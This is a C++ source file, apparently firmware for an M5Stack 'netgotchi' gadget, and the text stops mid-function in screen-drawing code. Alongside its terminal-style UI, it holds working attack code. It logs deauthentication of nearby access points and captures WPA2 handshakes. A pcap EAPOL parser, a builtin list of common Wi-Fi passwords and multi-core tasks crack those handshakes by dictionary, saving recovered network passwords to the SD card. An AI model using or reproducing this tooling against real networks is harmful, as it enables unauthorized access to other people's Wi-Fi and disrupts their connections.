#include "App.h"
#include "Virus.h"
#include "Theme.h"
#include "../core/RandomSeed.h"
#include <M5Unified.h>
#include <Arduino.h>
#include <SD.h>
#include <esp_heap_caps.h>
#include <stdarg.h>
#include "command/ProfileCommand.h"
#include "command/ThemeCommand.h"
#include "command/BrightnessCommand.h"
#include "command/PowerOffCommand.h"
#include "command/CrackCommand.h"
#include "../core/FastWpaCrack.h"
#include <freertos/queue.h>
#include <freertos/semphr.h>

#if defined(ARDUINO_M5STACK_CORES3)
    static constexpr int SD_CS = 4;
#elif defined(ARDUINO_M5STACK_CARDPUTER)
    static constexpr int SD_CS = 12;
#else
    static constexpr int SD_CS = 4;
#endif

static ProfileCommand    s_profile;
static CrackCommand      s_crack;
static ThemeCommand      s_theme;
static BrightnessCommand s_brightness;
static PowerOffCommand   s_poweroff;
static MenuCommand*      s_rootItems[] = {
    &s_profile, &s_crack, &s_theme, &s_brightness, &s_poweroff
};
static constexpr int ROOT_N = (int)(sizeof(s_rootItems) / sizeof(s_rootItems[0]));

namespace {
    // ── Layout ───────────────────────────────────────────────
    constexpr int SCR_W   = 320;
    constexpr int SCR_H   = 240;

    constexpr int MARGIN   = 4;              // outer screen padding
    constexpr int BAR_H    = 15;             // bar height
    constexpr int BAR_GAP  = 2;              // gap between bars (horiz + vert)

    constexpr int HEAD_TOP_PAD = 4;
    constexpr int HEAD_BOT_PAD = 2;
    constexpr int BAR1_Y       = HEAD_TOP_PAD;                            // 4
    constexpr int BAR2_Y       = BAR1_Y + BAR_H + BAR_GAP;               // 25
    constexpr int HEAD_H       = BAR2_Y + BAR_H + HEAD_BOT_PAD;          // 46

    // Cell strip ends before the virus icon (Virus::X0 is the authoritative position)
    constexpr int CELL_RIGHT   = Virus::X0 - MARGIN;

    // ── Vertical layout: header → log → input ────────────────
    constexpr int HEADER_DIVIDER_Y = HEAD_H;                  // 38
    constexpr int LOG_TOP          = HEADER_DIVIDER_Y + 1 + 4; // 43 (4px gap)
    constexpr int INPUT_DIVIDER_Y  = SCR_H - 22;              // 218
    constexpr int LOG_BOT          = INPUT_DIVIDER_Y - 4;     // 214 (4px gap)
    constexpr int INPUT_Y          = INPUT_DIVIDER_Y + 1 + 5; // 224 (5px gap)

    constexpr int LINE_H = 9;
    constexpr int CHAR_W = 6;
    constexpr int CHAR_H = 8;

    // Max printable chars per log line, derived from screen geometry:
    //   (320 - 2×4 margin) / 6px per char = 52 chars total
    //   minus 2-char prefix ("$ " or "  ") = 50 chars of usable body
    constexpr int LOG_MAXW = (SCR_W - 2 * MARGIN) / CHAR_W; // 52
    constexpr int LOG_BODY = LOG_MAXW - 2;                   // 50

    // ── Typing animation ─────────────────────────────────────
    constexpr uint32_t TYPE_STEP_MS = 35;
    constexpr uint32_t TYPE_HOLD_MS = 400;
    constexpr uint32_t CURSOR_MS    = 480;

    // ── Menu layout ───────────────────────────────────────────
    constexpr int MENU_ITEM_H = 18;
    constexpr int BRIGHT_BH   = 14;
}

// ── IMenuHost ─────────────────────────────────────────────────

void App::cmdPush(const char* text)   { _qPushCmd("%s", text); }
void App::outPush(const char* text)   { _qPushOut("%s", text); }
void App::menuClose() { _menuState = MenuState::Closed; _activeSubCmd = nullptr; }
void App::menuBack()  { _menuState = MenuState::Root;   _activeSubCmd = nullptr; }
void App::openSubMenu(MenuCommand* cmd) { _activeSubCmd = cmd; _menuState = MenuState::Sub; }
void App::setPendingTheme(int8_t idx)     { _pendingTheme  = idx; }
void App::setPendingBrightness(uint8_t v) { _pendingBright = (int)v; }
void App::setPendingPowerOff()            { _pendingPowerOff = true; }
void App::startCrack(const char* pcapPath, const char* dictPath) {
    strncpy(_crackPcapPath,           pcapPath, sizeof(_crackPcapPath)           - 1);
    strncpy(_crackCtx.wordlistPath,   dictPath, sizeof(_crackCtx.wordlistPath)   - 1);
    _startCrack();
}
uint32_t App::statsXp()         const { return _stats.xp(); }
uint32_t App::statsCaptures()   const { return _stats.captures(); }
uint32_t App::statsLevel()      const { return _stats.level(); }
uint32_t App::statsXpProgress() const { return _stats.xpProgress(); }
int      App::statsBattery()    const { return _stats.battery(); }
bool     App::statsCharging()   const { return _stats.isCharging(); }

// ── Init ──────────────────────────────────────────────────────

void App::init() {
    Serial.begin(115200);
    RandomSeed::init();

    if (psramFound()) {
        psramInit();
        Serial.printf("[INIT] PSRAM %uKB free\n", ESP.getFreePsram() / 1024);
    }

    auto cfg = M5.config();
    M5.begin(cfg);
    M5.Display.setBrightness(Theme::brightness());  // default until load() overrides

    _canvas = new M5Canvas(&M5.Display);
    _canvas->setColorDepth(16);
    _canvas->createSprite(SCR_W, SCR_H);

    bool sdOk = SD.begin(SD_CS);
    if (sdOk) {
        Serial.printf("[SD] OK  %lluMB total\n", SD.totalBytes() / (1024 * 1024));
        SD.mkdir("/netgotchi");
        SD.mkdir("/netgotchi/eapol");
        SD.mkdir("/netgotchi/dictionaries");
    } else {
        Serial.println("[SD] Mount failed — captures won't be saved");
    }

    _stats.load();
    Theme::load();
    _hunter.init();

    uint32_t ms = millis();
    _cursorMs   = ms;
    _typeStepMs = ms;

    _qPushCmd("boot netgotchi");
    _qPushOut("net_gotchi term v0.1");
    _qPushOut("psram %ukb free", (unsigned)(ESP.getFreePsram() / 1024));
    if (sdOk) _qPushOut("sd ok %llumb", SD.totalBytes() / (1024 * 1024));
    else      _qPushOut("sd: mount failed");
    _qPushOut("wifi promisc up");
    _qPushCmd("service netgotchi start");
    _qPushOut("ready.");

    Serial.println("[INIT] Term boot complete");
}

// ── Log ring ──────────────────────────────────────────────────

void App::_logPush(const char* line) {
    strncpy(_logBuf[_logHead], line, LINE_COL - 1);
    _logBuf[_logHead][LINE_COL - 1] = '\0';
    _logHead = (_logHead + 1) % LOG_LINES;
}

// ── Queue ─────────────────────────────────────────────────────

void App::_qPushCmd(const char* fmt, ...) {
    if (_qCount >= Q_SIZE) return;
    va_list ap; va_start(ap, fmt);
    vsnprintf(_queue[_qTail], LINE_COL, fmt, ap);
    va_end(ap);
    _queueKind[_qTail] = KIND_CMD;
    _qTail = (_qTail + 1) % Q_SIZE;
    _qCount++;
}

void App::_qPushOut(const char* fmt, ...) {
    if (_qCount >= Q_SIZE) return;
    va_list ap; va_start(ap, fmt);
    vsnprintf(_queue[_qTail], LINE_COL, fmt, ap);
    va_end(ap);
    _queueKind[_qTail] = KIND_OUT;
    _qTail = (_qTail + 1) % Q_SIZE;
    _qCount++;
}

bool App::_qPop(uint8_t* outKind) {
    if (_qCount == 0) return false;
    strncpy(_typeLine, _queue[_qHead], LINE_COL - 1);
    _typeLine[LINE_COL - 1] = '\0';
    if (outKind) *outKind = _queueKind[_qHead];
    _qHead = (_qHead + 1) % Q_SIZE;
    _qCount--;
    _typeLen = (int)strlen(_typeLine);
    _typeIdx = 0;
    _typeDone = false;
    _typeDoneMs = 0;
    return true;
}

// ── Typing animation ──────────────────────────────────────────

void App::_updateTyping(uint32_t ms) {
    // Cursor blink
    if (ms - _cursorMs >= CURSOR_MS) {
        _cursorMs = ms;
        _cursorOn = !_cursorOn;
    }

    // Idle: drain any queued OUTPUT lines straight into the log
    // (no animation), then start typing the next COMMAND if there is one.
    if (_typeLen == 0) {
        uint8_t kind;
        while (_qPop(&kind)) {
            if (kind == KIND_OUT) {
                char buf[LINE_COL + 4];
                snprintf(buf, sizeof(buf), "  %s", _typeLine);
                _logPush(buf);
                _typeLine[0] = '\0';
                _typeLen = 0;
                continue;
            }
            // KIND_CMD — start typing animation
            _typeStepMs = ms;
            break;
        }
        return;
    }

    // Currently typing a command
    if (!_typeDone) {
        if (ms - _typeStepMs >= TYPE_STEP_MS) {
            _typeStepMs = ms;
            _typeIdx++;
            if (_typeIdx >= _typeLen) {
                _typeIdx   = _typeLen;
                _typeDone  = true;
                _typeDoneMs = ms;
            }
        }
        return;
    }

    // Done typing — hold a beat, then commit to log with "$ " prefix
    if (ms - _typeDoneMs >= TYPE_HOLD_MS) {
        char buf[LINE_COL + 4];
        snprintf(buf, sizeof(buf), "$ %s", _typeLine);
        _logPush(buf);
        _typeLine[0] = '\0';
        _typeLen = _typeIdx = 0;
        _typeDone = false;
        // Apply any pending configuration changes now that cmd is in the log
        if (_pendingTheme >= 0) {
            Theme::apply(_pendingTheme);
            Theme::save();
            _pendingTheme = -1;
        }
        if (_pendingBright >= 0) {
            Theme::applyBrightness((uint8_t)_pendingBright);
            Theme::save();
            _pendingBright = -1;
        }
        if (_pendingPowerOff) {
            _pendingPowerOff = false;
            _menuState = MenuState::PowerWait;
            _powerOffMs = ms;
        }
    }
}

// ── Hunting integration ───────────────────────────────────────

void App::_updateHunting(uint32_t ms) {
    if (_crackState != CrackState::Idle) return;
    if (ms - _statusLogMs >= 10000) {
        _statusLogMs = ms;
        Serial.printf("[STATUS] phase=%d ch=%d bat=%d%% caps=%lu xp=%lu\n",
                      (int)_hunter.phase(),
                      _hunter.channel(),
                      M5.Power.getBatteryLevel(),
                      (unsigned long)_stats.captures(),
                      (unsigned long)_stats.xp());
    }

    if (_menuState != MenuState::Closed) return;

    // ── Exhaust sequence state machine ───────────────────────────
    if (_exhaustPhase == 1) {
        if (ms < _pauseUntilMs) return;      // waiting 60 s
        _qPushCmd("service netgotchi start");
        _pauseUntilMs = ms + 5000;
        _exhaustPhase = 2;
        return;
    }
    if (_exhaustPhase == 2) {
        if (ms < _pauseUntilMs) return;      // waiting 5 s
        _qPushCmd("setchannel 1");
        _exhaustPhase = 0;
        // fall through — hunter resumes below
    }

    _hunter.update(ms);

    // Channel hop — fires once per hop; wrapping 13→1 triggers exhaust sequence
    uint8_t ch = _hunter.channel();
    if (ch != _lastChannel) {
        if (_lastChannel == 13 && ch == 1) {
            _hunter.clearFindings(ms);
            _lastApFoundCount      = 0;
            _lastDeauthTargetCount = 0;
            _lastEapolEventCount   = 0;
            _lastCaptureCount      = 0;
            _lastChannel = ch;
            _qPushCmd("service netgotchi exhaust 60");
            _pauseUntilMs = ms + 60000;
            _exhaustPhase = 1;
            return;                          // setchannel 1 deferred to phase 2 end
        }
        _lastChannel = ch;
        _qPushCmd("setchannel %d", ch);
    }

    // New AP found — passive receive
    // LOG_BODY=50: "detected " (9) + SSID up to 32 = 41 chars ≤ 50
    uint32_t afc = _hunter.apFoundCount();
    if (afc > _lastApFoundCount) {
        _lastApFoundCount = afc;
        const char* ssid = _hunter.lastFoundSsid();
        _qPushOut("detected %.32s", (ssid && ssid[0]) ? ssid : "<hidden>");
    }

    // Deauth sent — first attempt per AP target only
    // LOG_BODY=50: "deauth " (7) + SSID up to 32 = 39 chars ≤ 50
    uint32_t dtc = _hunter.deauthTargetCount();
    if (dtc > _lastDeauthTargetCount) {
        _lastDeauthTargetCount = dtc;
        const char* dsid = _hunter.lastDeauthSsid();
        _qPushCmd("deauth %.32s", (dsid && dsid[0]) ? dsid : "??");
    }

    // EAPOL frame received — passive receive
    // LOG_BODY=50: "[+] eapol M1 " (13) + SSID up to 32 = 45 chars ≤ 50
    uint32_t eec = _hunter.eapolEventCount();
    if (eec > _lastEapolEventCount) {
        _lastEapolEventCount = eec;
        int msg = _hunter.lastEapolMsg();
        const char* esid = _hunter.lastEapolSsid();
        _qPushOut("traced eapol M%d %.32s", msg, (esid && esid[0]) ? esid : "??");
    }

    // Handshake complete — dump command with real file size as end address
    // LOG_BODY=50: "dump 0xHHHH..0xHHHH >> " (23) + filename up to 27 = 50 chars
    uint32_t caps = _hunter.captureCount();
    if (caps > _lastCaptureCount) {
        _lastCaptureCount = caps;
        const char* path  = _hunter.lastCapturePath();
        const char* fname = strrchr(path, '/');
        fname = fname ? fname + 1 : path;
        _stats.onCapture();
        _stats.save();
        File pcap = SD.open(path, FILE_READ);
        uint32_t fsize = pcap ? (uint32_t)pcap.size() : 512;
        if (pcap) pcap.close();
        uint16_t r1 = 0x1000 + (uint16_t)(rand() & 0xCFFF);
        uint16_t r2 = r1 + (uint16_t)(fsize & 0xFFFF);
        _qPushCmd("dump 0x%04x..0x%04x >> %.27s", r1, r2, fname);
    }
}

// ── Crack ─────────────────────────────────────────────────────

static const char* const kCrackPasswords[] = {
  "12345678",  "123456789", "1234567890", "11111111",  "00000000",
  "87654321",  "11223344",  "12344321",   "99999999",  "88888888",
  "55555555",  "12121212",  "13131313",   "10101010",  "98765432",
  "12341234",  "11112222",  "22222222",   "33333333",  "44444444",
  "66666666",  "77777777",  "01234567",   "20202020",  "19191919",
  "password",  "password1", "passw0rd",   "pass1234",  "password12",
  "password123","admin123", "admin1234",  "admin2020", "root1234",
  "master12",  "login123",  "access14",   "letmein1",  "trustno1",
  "welcome1",  "changeme",  "default1",   "guest1234", "user1234",
  "test1234",  "temp1234",  "pass12345",  "p@ssw0rd",  "p@ss1234",
  "qwerty123", "qwertyui",  "qwerty12",   "qwer1234",  "qwerasdf",
  "asdfghjk",  "asdf1234",  "zxcvbnm1",   "1234asdf",  "1234qwer",
  "1q2w3e4r",  "zaq12wsx",  "1qaz2wsx",   "qazwsx123", "!q2w3e4r",
  "wifi1234",  "wifi12345", "wlan1234",   "router12",  "netgear1",
  "linksys1",  "dlink1234", "tplink12",   "huawei12",  "modem123",
  "internet",  "wireless",  "network1",   "connect1",  "homewifi",
  "mywifi123", "wifiwifi",  "setup1234",  "broadband", "fiber123",
  "abc12345",  "abcd1234",  "1234abcd",   "aa123456",  "a1234567",
  "a1b2c3d4",  "aaa11111",  "xyz12345",   "system12",  "server12",
  "cisco123",  "ubnt1234",  "mikrotik",   "radius12",  "monitor1",
  "14141414",  "12345679",  "11111112",   "01020304",  "02468024",
  "13572468",  "10203040",  "11235813",   "31415926",  "27182818",
};
static constexpr int kCrackPasswordCount =
    (int)(sizeof(kCrackPasswords) / sizeof(kCrackPasswords[0]));

// ── PCAP helpers ──────────────────────────────────────────────

static const uint8_t kEapolSnapSig[8] = {0xAA,0xAA,0x03,0x00,0x00,0x00,0x88,0x8E};
static constexpr uint16_t kKiAck     = 0x0080;
static constexpr uint16_t kKiMic     = 0x0100;
static constexpr uint16_t kKiInstall = 0x0040;

static bool crackPcapRead32(File& f, uint32_t& v) {
    uint8_t b[4];
    if (f.read(b, 4) != 4) return false;
    v = (uint32_t)b[0]|((uint32_t)b[1]<<8)|((uint32_t)b[2]<<16)|((uint32_t)b[3]<<24);
    return true;
}

static int crackFindSnap(const uint8_t* frm, uint16_t len) {
    for (uint16_t i = 0; i + 8 <= len; i++) {
        bool ok = true;
        for (int k = 0; k < 8; k++) if (frm[i+k] != kEapolSnapSig[k]) { ok=false; break; }
        if (ok) return (int)i;
    }
    return -1;
}

static const uint8_t* crackParseEapolKey(const uint8_t* frm, uint16_t flen,
                                          const uint8_t** eapolOut, uint16_t* totalOut) {
    if (flen < 24) return nullptr;
    const uint16_t fc = (uint16_t)frm[0] | ((uint16_t)frm[1] << 8);
    if (((fc & 0x000C) >> 2) != 2) return nullptr;
    int snap = crackFindSnap(frm, flen);
    if (snap < 0 || (uint16_t)(snap + 9) >= flen) return nullptr;
    const uint8_t* eapol = frm + snap + 8;
    if (eapol[1] != 0x03) return nullptr;
    uint16_t eap_len = ((uint16_t)eapol[2] << 8) | eapol[3];
    uint16_t total   = 4 + eap_len;
    uint16_t avail   = flen - (uint16_t)(snap + 8);
    if (total < 97 || avail < 97) return nullptr;
    if (total > avail) total = avail;
    *eapolOut = eapol;
    *totalOut = total;
    return eapol + 4;
}

static bool crackParsePcap(const char* path, CrackHandshake& hs) {
    memset(&hs, 0, sizeof(hs));
    File f = SD.open(path, FILE_READ);
    if (!f) return false;

    uint8_t gh[24];
    if (f.read(gh, 24) != 24 ||
        !(gh[0]==0xD4&&gh[1]==0xC3&&gh[2]==0xB2&&gh[3]==0xA1)) { f.close(); return false; }

    uint32_t linktype = (uint32_t)gh[20]|((uint32_t)gh[21]<<8)|
                        ((uint32_t)gh[22]<<16)|((uint32_t)gh[23]<<24);

    bool gotAnonce = false, gotM2 = false;
    uint8_t lastAnonce[32]={}, lastAp[6]={}, lastSta[6]={};
    bool pendM2=false;
    uint8_t pendSta[6]={}, pendAp[6]={}, pendSnonce[32]={}, pendMic[16]={};
    uint8_t pendEapol[300]={};
    uint16_t pendEapolLen=0;
    uint8_t rec[512];

    while (f.available() > 16) {
        uint32_t ts,tu,incl,orig;
        if (!crackPcapRead32(f,ts)||!crackPcapRead32(f,tu)||
            !crackPcapRead32(f,incl)||!crackPcapRead32(f,orig)) break;
        if (!incl || incl > sizeof(rec)) { f.seek(f.position()+incl); continue; }
        if (f.read(rec, incl) != (int)incl) break;
        uint16_t off = 0;
        if (linktype == 127) {
            if (incl < 4) continue;
            off = (uint16_t)rec[2]|((uint16_t)rec[3]<<8);
            if (off >= incl) continue;
        }
        const uint8_t* frm  = rec + off;
        uint16_t       flen = (uint16_t)(incl - off);

        // Beacon — grab SSID
        const uint16_t fc    = (uint16_t)frm[0]|((uint16_t)frm[1]<<8);
        const uint8_t  fcTyp = (fc & 0x000C) >> 2;
        const uint8_t  fcSub = (fc & 0x00F0) >> 4;
        if (fcTyp==0 && fcSub==8 && flen>=36 && hs.ssid[0]=='\0') {
            uint16_t pos = 36;
            while (pos + 2 <= flen) {
                uint8_t id=frm[pos], elen=frm[pos+1];
                if (pos+2+elen > flen) break;
                if (id==0 && elen>0 && elen<=32) {
                    memcpy(hs.ssid, frm+pos+2, elen); hs.ssid[elen]='\0';
                    hs.ssid_len=(uint8_t)elen; break;
                }
                pos += 2 + elen;
            }
            continue;
        }

        const uint8_t* eapol; uint16_t total;
        const uint8_t* key = crackParseEapolKey(frm, flen, &eapol, &total);
        if (!key) continue;
        uint16_t ki = ((uint16_t)key[1]<<8)|key[2];
        bool ack=ki&kKiAck, mic=ki&kKiMic, inst=ki&kKiInstall;

        if (ack && (!mic||inst)) {
            memcpy(lastAp, frm+10, 6); memcpy(lastSta, frm+4, 6);
            memcpy(lastAnonce, key+13, 32); gotAnonce=true;
            if (pendM2 && memcmp(pendSta,lastSta,6)==0 && memcmp(pendAp,lastAp,6)==0) {
                memcpy(hs.ap,lastAp,6); memcpy(hs.sta,lastSta,6);
                memcpy(hs.anonce,lastAnonce,32); memcpy(hs.snonce,pendSnonce,32);
                memcpy(hs.mic,pendMic,16);
                if (pendEapolLen<=sizeof(hs.eapol)) {
                    memcpy(hs.eapol,pendEapol,pendEapolLen);
                    memset(hs.eapol+81,0,16); hs.eapol_len=pendEapolLen;
                }
                gotM2=true;
            }
        } else if (!ack && mic && !inst) {
            bool nonceZero=true;
            for (int z=0;z<32&&nonceZero;z++) nonceZero=(key[13+z]==0);
            if (nonceZero) continue;
            if (gotAnonce && memcmp(frm+10,lastSta,6)==0 && memcmp(frm+4,lastAp,6)==0) {
                memcpy(hs.ap,lastAp,6); memcpy(hs.sta,lastSta,6);
                memcpy(hs.anonce,lastAnonce,32); memcpy(hs.snonce,key+13,32);
                memcpy(hs.mic,eapol+81,16);
                if (total<=sizeof(hs.eapol)) {
                    memcpy(hs.eapol,eapol,total);
                    memset(hs.eapol+81,0,16); hs.eapol_len=total;
                }
                gotM2=true;
            } else {
                pendM2=true;
                memcpy(pendSta,frm+10,6); memcpy(pendAp,frm+4,6);
                memcpy(pendSnonce,key+13,32); memcpy(pendMic,eapol+81,16);
                if (total<=sizeof(pendEapol)) {
                    memcpy(pendEapol,eapol,total);
                    memset(pendEapol+81,0,16); pendEapolLen=total;
                }
            }
        }
    }
    f.close();
    if (!gotM2) return false;

    // SSID fallback from filename
    if (hs.ssid[0]=='\0') {
        const char* sl=strrchr(path,'/');
        const char* us=strchr(sl?sl+1:path,'_');
        const char* dt=strrchr(path,'.');
        if (us && dt && dt>us+1) {
            int n=(int)(dt-us-1); if (n>32) n=32;
            memcpy(hs.ssid, us+1, n); hs.ssid[n]='\0';
            hs.ssid_len=(uint8_t)n;
        }
        if (hs.ssid[0]=='\0') return false;
    }

    // Build PRF data
    uint8_t* p=hs.prf_data;
    if (memcmp(hs.ap,hs.sta,6)<0) { memcpy(p,hs.ap,6);p+=6;memcpy(p,hs.sta,6);p+=6; }
    else                           { memcpy(p,hs.sta,6);p+=6;memcpy(p,hs.ap,6);p+=6;  }
    if (memcmp(hs.anonce,hs.snonce,32)<0) {
        memcpy(p,hs.anonce,32);p+=32;memcpy(p,hs.snonce,32);
    } else {
        memcpy(p,hs.snonce,32);p+=32;memcpy(p,hs.anonce,32);
    }
    return true;
}

void App::_crackWorkerTask(void* param) {
    CrackCtx* ctx = static_cast<CrackCtx*>(param);
    CrackPwEntry entry;
    while (true) {
        if (xQueueReceive(ctx->queue, &entry, portMAX_DELAY) != pdTRUE) break;
        if (entry.len == 0) break;
        if (ctx->found || ctx->stop) {
            __atomic_fetch_add(&ctx->tested, 1, __ATOMIC_RELAXED); continue;
        }
        if (fast_wpa2_try_password(entry.pw, entry.len,
                                    ctx->hs.ssid, ctx->hs.ssid_len,
                                    ctx->hs.prf_data, ctx->hs.eapol,
                                    ctx->hs.eapol_len, ctx->hs.mic)) {
            ctx->found = true;
            memcpy(ctx->foundPass, entry.pw, entry.len + 1);
        }
        __atomic_fetch_add(&ctx->tested, 1, __ATOMIC_RELAXED);
    }
    xSemaphoreGive(ctx->doneSem);
    vTaskDelete(NULL);
}

void App::_crackProdTask(void* param) {
    CrackCtx* ctx = static_cast<CrackCtx*>(param);

    auto tryHere = [&](const char* pw, size_t len) {
        memcpy(ctx->curPass, pw, len + 1);
        if (fast_wpa2_try_password(pw, (uint8_t)len,
                                    ctx->hs.ssid, ctx->hs.ssid_len,
                                    ctx->hs.prf_data, ctx->hs.eapol,
                                    ctx->hs.eapol_len, ctx->hs.mic)) {
            memcpy(ctx->foundPass, pw, len + 1);
            ctx->found = true;
        }
        __atomic_fetch_add(&ctx->tested, 1, __ATOMIC_RELAXED);
    };

    auto sendToWorker = [&](const char* pw, size_t len) -> bool {
        CrackPwEntry entry;
        memcpy(entry.pw, pw, len + 1);
        entry.len = (uint8_t)len;
        return xQueueSend(ctx->queue, &entry, 0) == pdTRUE;
    };

    if (strcmp(ctx->wordlistPath, "builtin") == 0) {
        int i = 0;
        while (i < kCrackPasswordCount && !ctx->stop && !ctx->found) {
            size_t n = strlen(kCrackPasswords[i]);
            if (!sendToWorker(kCrackPasswords[i], n)) {
                tryHere(kCrackPasswords[i], n); i++;
            } else {
                i++;
                if (i < kCrackPasswordCount && !ctx->stop && !ctx->found) {
                    tryHere(kCrackPasswords[i], strlen(kCrackPasswords[i])); i++;
                }
            }
            ctx->bytesDone = (uint32_t)i;
        }
    } else {
        char line[64], line2[64];
        File f = SD.open(ctx->wordlistPath, FILE_READ);
        if (f) {
            while (f.available() && !ctx->stop && !ctx->found) {
                size_t n = f.readBytesUntil('\n', line, 63);
                line[n] = '\0';
                while (n > 0 && (line[n-1] == '\r' || line[n-1] == '\n')) line[--n] = '\0';
                if (n < 8 || n > 63) { ctx->bytesDone = (uint32_t)f.position(); continue; }
                if (!sendToWorker(line, n)) {
                    tryHere(line, n);
                } else if (f.available() && !ctx->stop && !ctx->found) {
                    size_t n2 = f.readBytesUntil('\n', line2, 63);
                    line2[n2] = '\0';
                    while (n2 > 0 && (line2[n2-1] == '\r' || line2[n2-1] == '\n')) line2[--n2] = '\0';
                    if (n2 >= 8 && n2 <= 63) tryHere(line2, n2);
                }
                ctx->bytesDone = (uint32_t)f.position();
            }
            f.close();
        }
    }

    CrackPwEntry poison; memset(&poison, 0, sizeof(poison));
    xQueueSend(ctx->queue, &poison, pdMS_TO_TICKS(2000));
    xSemaphoreTake(ctx->doneSem, pdMS_TO_TICKS(5000));
    ctx->done = true;
    vTaskDelete(nullptr);
}

void App::_startCrack() {
    _qPushCmd("crack");

    CrackHandshake hs;
    if (!crackParsePcap(_crackPcapPath, hs)) {
        _qPushOut("handshake parse failed");
        return;
    }

    _qPushOut("service stop");
    _qPushOut("target: %.32s", hs.ssid);
    _hunter.pause();

    // Preserve wordlistPath — it was set before _startCrack() was called
    char wlPath[64];
    strncpy(wlPath, _crackCtx.wordlistPath, sizeof(wlPath) - 1);
    wlPath[sizeof(wlPath)-1] = '\0';

    memset(&_crackCtx, 0, sizeof(_crackCtx));
    _crackCtx.hs = hs;
    strncpy(_crackCtx.wordlistPath, wlPath, sizeof(_crackCtx.wordlistPath) - 1);

    if (strcmp(_crackCtx.wordlistPath, "builtin") == 0) {
        _crackCtx.fileSize = (uint32_t)kCrackPasswordCount;
    } else {
        File wf = SD.open(_crackCtx.wordlistPath, FILE_READ);
        _crackCtx.fileSize = wf ? (uint32_t)wf.size() : 1;
        if (wf) wf.close();
    }

    _crackCtx.queue   = xQueueCreate(CRACK_QUEUE_DEPTH, sizeof(CrackPwEntry));
    _crackCtx.doneSem = xSemaphoreCreateBinary();

    xTaskCreatePinnedToCore(_crackWorkerTask, "wpa2_w", 8192, &_crackCtx, 1,
                            &_crackCtx.workerHandle, 0);
    xTaskCreatePinnedToCore(_crackProdTask,   "wpa2_p", 8192, &_crackCtx, 1,
                            &_crackProdHandle, 1);

    _crackState = CrackState::Running;
}

void App::_updateCracking(uint32_t ms) {
    (void)ms;
    if (!_crackCtx.done) return;

    // Tasks finished — clean up
    _crackProdHandle = nullptr;
    _crackCtx.workerHandle = nullptr;
    if (_crackCtx.queue)   { vQueueDelete(_crackCtx.queue);       _crackCtx.queue   = nullptr; }
    if (_crackCtx.doneSem) { vSemaphoreDelete(_crackCtx.doneSem); _crackCtx.doneSem = nullptr; }

    if (_crackCtx.found) {
        // Save cracked password
        char savePath[80];
        char bssid[13];
        snprintf(bssid, sizeof(bssid), "%02X%02X%02X%02X%02X%02X",
                 _crackCtx.hs.ap[0], _crackCtx.hs.ap[1], _crackCtx.hs.ap[2],
                 _crackCtx.hs.ap[3], _crackCtx.hs.ap[4], _crackCtx.hs.ap[5]);
        SD.mkdir("/netgotchi/cracked");
        snprintf(savePath, sizeof(savePath), "/netgotchi/cracked/%.12s_%.32s.pass",
                 bssid, _crackCtx.hs.ssid);
        File pf = SD.open(savePath, FILE_WRITE);
        if (pf) { pf.print(_crackCtx.foundPass); pf.close(); }

        _qPushOut("ssid: %.32s", _crackCtx.hs.ssid);
        _qPushOut("pass: %.32s", _crackCtx.foundPass);
    }

    _qPushOut("finish");
    _qPushCmd("service netgotchi start");

    _hunter.resume();
    _crackState = CrackState::Idle;
}

// ── Touch handling ────────────────────────────────────────────

void App::_handleTouch(uint32_t ms) {
    auto t = M5.Touch.getDetail();
    if (_menuState == MenuState::PowerWait) return;

    bool pressed  = t.isPressed();
    bool released = t.wasReleased();
    int  tx = t.x, ty = t.y;

    if (_menuState == MenuState::Closed) {
        if (t.wasPressed() && tx >= Virus::X0 && ty >= 0 && ty < HEADER_DIVIDER_Y) {
            _menuState      = MenuState::Root;
            _menuHighlight  = -1;
            _menuJustOpened = true;
        }
        return;
    }

    if (_menuJustOpened) {
        if (released) _menuJustOpened = false;
        return;
    }

    int nItems = 0, itemH = MENU_ITEM_H, menuTop = 0;
    if (_menuState == MenuState::Root) {
        nItems = ROOT_N;
    } else if (_menuState == MenuState::Sub && _activeSubCmd) {
        nItems = _activeSubCmd->subCount();
        itemH  = _activeSubCmd->subItemH();
    }
    menuTop = INPUT_DIVIDER_Y - nItems * itemH;

    bool inMenu = (tx >= MARGIN && tx < SCR_W - MARGIN &&
                   ty >= menuTop && ty < INPUT_DIVIDER_Y);
    int hitItem = -1;
    if (inMenu) {
        hitItem = (ty - menuTop) / itemH;
        if (hitItem >= nItems) hitItem = -1;
    }

    if (pressed) {
        _menuHighlight = (int8_t)hitItem;
        return;
    }

    if (!released) return;

    int sel        = (int)_menuHighlight;
    _menuHighlight = -1;

    if (!inMenu || sel < 0) {
        menuClose();
        return;
    }

    if (_menuState == MenuState::Root) {
        s_rootItems[sel]->execute(*this);
        return;
    }

    if (_menuState == MenuState::Sub && _activeSubCmd) {
        _activeSubCmd->onSubSelect(*this, sel);
        return;
    }
}

// ── Header ────────────────────────────────────────────────────

// Draw a bar with [LABEL ==== VALUE] rendered inside.
//   - unfilled portion: pale green bg
//   - filled portion: bright green fill
//   - label/value text: black, sits on top of either bg
static void drawValueBar(M5Canvas& c,
                         int barX, int barY, int barW, int barH,
                         const char* label, const char* valText, int fillPct)
{
    if (barW < 8 || barH < 6) return;
    if (fillPct < 0)   fillPct = 0;
    if (fillPct > 100) fillPct = 100;

    // Pale-green background (unfilled), with dim-green border
    c.fillRect(barX, barY, barW, barH, Theme::PALE);
    c.drawRect(barX, barY, barW, barH, Theme::DIM);

    const int innerW = barW - 2;
    const int innerH = barH - 2;
    const int innerX = barX + 1;
    const int innerY = barY + 1;
    const int fill   = innerW * fillPct / 100;
    if (fill > 0) c.fillRect(innerX, innerY, fill, innerH, Theme::FG);

    // Black text overlays both fills
    c.setFont(&fonts::Font0);
    c.setTextSize(1);
    c.setTextColor(Theme::BG);
    const int midY = barY + barH / 2 + 1;
    const int padL = (barH - CHAR_H) / 2;   // left/right pad = vertical gap to bar edge

    c.setTextDatum(lgfx::middle_left);
    c.drawString(label, barX + padL + 1, midY);

    c.setTextDatum(lgfx::middle_right);
    c.drawString(valText, barX + barW - padL + 1, midY);
}

void App::_drawHud(M5Canvas& c, uint32_t ms) const {
    c.fillRect(0, 0, SCR_W, HEAD_H, Theme::BG);

    // Battery
    int  bat      = _stats.battery();
    bool charging = _stats.isCharging();

    // RAM (used %)
    uint32_t freeH  = (uint32_t)heap_caps_get_free_size(MALLOC_CAP_INTERNAL)
                    + (uint32_t)heap_caps_get_free_size(MALLOC_CAP_SPIRAM);
    uint32_t totalH = (uint32_t)heap_caps_get_total_size(MALLOC_CAP_INTERNAL)
                    + (uint32_t)heap_caps_get_total_size(MALLOC_CAP_SPIRAM);
